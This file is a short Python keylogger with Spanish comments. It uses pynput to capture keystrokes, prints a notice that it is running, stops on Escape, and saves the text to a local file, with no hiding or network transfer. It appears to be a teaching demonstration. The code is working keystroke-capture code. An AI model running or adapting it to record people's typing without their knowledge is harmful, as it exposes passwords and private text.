from pynput import keyboard  # Importamos la librería que monitorea el teclado

# Nombre del archivo donde se guardará el texto capturado
log_file = "keylog.txt"

# Variable para almacenar temporalmente el texto completo
buffer = ""

# Variable para indicar si el programa debe detenerse
stop_program = False


# Función que se ejecuta cada vez que se presiona una tecla
def on_press(key):
    global buffer, stop_program  # Usamos variables globales

    try:
        # Si se detecta la tecla "Escape", detenemos el listener
        if key == keyboard.Key.esc:
            stop_program = True  # Marcamos que el programa debe detenerse
            # Guardamos el texto completo en el archivo antes de detener
            with open(log_file, "w", encoding="utf-8") as file:
                file.write(buffer)  # Escribimos todo el buffer en el archivo
            return False  # Salimos del listener

        # Si la tecla presionada es espacio, agregamos un espacio al buffer
        if key == keyboard.Key.space:
            buffer += " "

        # Si es Enter, agregamos un salto de línea
        elif key == keyboard.Key.enter:
            buffer += "\n"

        # Si es Backspace, eliminamos el último carácter del buffer
        elif key == keyboard.Key.backspace and buffer:
            buffer = buffer[:-1]

        # Si es una tecla alfanumérica, la agregamos al buffer
        elif hasattr(key, "char") and key.char is not None:
            buffer += key.char

    except Exception:
        pass  # Evita imprimir errores en la consola


# Iniciamos el listener del teclado para capturar las teclas presionadas
print("El keylogger está en ejecución. Presiona 'Escape' para "
      "detenerlo y guardar el texto.")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()  # Mantiene el script ejecutándose para escuchar las teclas

# Se imprimirá cuando el listener termine correctamente
print("\nEl programa se detuvo manualmente.")
